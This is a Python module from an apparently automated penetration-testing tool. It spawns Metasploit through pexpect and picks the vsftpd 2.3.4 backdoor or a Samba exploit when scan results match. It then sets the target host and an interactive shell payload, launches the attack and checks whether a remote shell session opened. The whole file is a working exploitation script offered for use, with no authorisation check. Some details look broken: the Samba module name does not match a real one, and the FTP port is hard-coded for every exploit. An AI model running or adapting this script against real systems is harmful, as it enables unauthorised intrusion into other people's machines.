# src/exploit/exploit_main.py
"""
Module: Exploitation
Description: Automates exploitation steps using Metasploit or direct scripts.
Dependencies:
    pip install pexpect
"""

import pexpect
import time

def run_exploit(target, vuln_info):
    """
    - If certain vulnerabilities are found, attempt exploitation via Metasploit.
    - Returns a dict with success/failure, session info, etc.
    """
    found_vulns = vuln_info.get("found_vulns", [])
    if not found_vulns:
        print("[EXPLOIT] No known vulnerabilities found to exploit.")
        return {"success": False}

    print("[EXPLOIT] Starting Metasploit to exploit discovered vulnerabilities...")

    # Example: If we see a Samba or vsFTPd vulnerability, we pick an exploit
    chosen_exploit = None
    for v in found_vulns:
        details = v["details"].lower()
        if "vsftp" in details:
            chosen_exploit = "exploit/unix/ftp/vsftpd_234_backdoor"
            break
        elif "samba" in details:
            chosen_exploit = "exploit/linux/samba/is_known_vuln"
            break
        # Add more conditions as needed

    if not chosen_exploit:
        print("[EXPLOIT] No matching exploit in this example. Exiting.")
        return {"success": False}

    try:
        # Start msfconsole with pexpect
        child = pexpect.spawn("msfconsole", timeout=300)
        child.expect_exact("msf6 >")
        child.sendline(f"use {chosen_exploit}")
        child.expect_exact("msf6 exploit(")
        
        # Example: set the required options
        child.sendline(f"set RHOSTS {target}")
        child.expect_exact("msf6 exploit(")
        child.sendline("set RPORT 21")  # if it's an FTP exploit
        child.expect_exact("msf6 exploit(")
        
        # Possibly set a PAYLOAD
        child.sendline("set PAYLOAD cmd/unix/interact")
        child.expect_exact("msf6 exploit(")
        
        # Launch exploit
        child.sendline("run")
        index = child.expect([pexpect.TIMEOUT, "Command shell session", "Meterpreter session"], timeout=120)
        
        if index == 0:
            print("[EXPLOIT] Timed out waiting for exploitation result.")
            child.sendline("exit")
            child.close(force=True)
            return {"success": False}
        else:
            print("[EXPLOIT] Exploit likely succeeded. We have a session!")
            # You can interact or gather info here, or just confirm success
            # For demonstration, we exit
            child.sendline("exit")
            child.close(force=True)
            return {
                "success": True,
                "exploit_used": chosen_exploit,
                "session_type": "shell"
            }
    except pexpect.EOF:
        print("[EXPLOIT] Metasploit unexpectedly closed.")
        return {"success": False}

